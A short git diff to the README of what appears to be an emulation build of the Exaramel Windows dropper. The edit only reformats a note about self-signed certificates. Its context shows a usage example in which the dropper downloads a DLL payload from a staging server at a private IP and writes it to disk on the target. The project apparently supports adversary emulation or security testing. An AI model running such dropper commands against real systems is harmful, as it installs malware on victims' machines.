@@ -25,7 +25,7 @@ Example:
     .\Exaramel-windows-Dropper.exe http://192.168.0.4/getFile/Exaramel-Windows.dll .\Exaramel-Windows.dll
 ```
 
-`Note: This program does not work with self-signed certificates unless you import the certificate on the target system first.`
+>Note: This program does not work with self-signed certificates unless you import the certificate on the target system first.
 
 ## Build Instructions
 
